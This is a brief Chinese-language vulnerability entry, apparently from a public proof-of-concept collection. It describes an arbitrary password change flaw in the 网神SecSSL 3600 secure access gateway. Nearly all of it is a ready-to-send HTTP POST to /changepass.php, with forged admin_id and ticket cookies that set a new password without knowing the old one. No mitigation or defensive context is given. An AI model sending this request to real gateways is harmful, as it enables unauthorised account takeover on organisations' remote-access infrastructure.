#### 影响范围

网神SecSSL 3600

#### 漏洞概述

网神SecSSL 3600安全接入网关系统任意密码修改

#### 漏洞复现

漏洞POC：

```
POST /changepass.php?type=2 
Cookie: admin_id=1;gw_user_ticket=ffffffffffffffffffffffffffffffff;last_step_param={"this_name":"test","subAuthId":"1"}

old_pass=&password=Test123!@&repassword=Test123!@
```

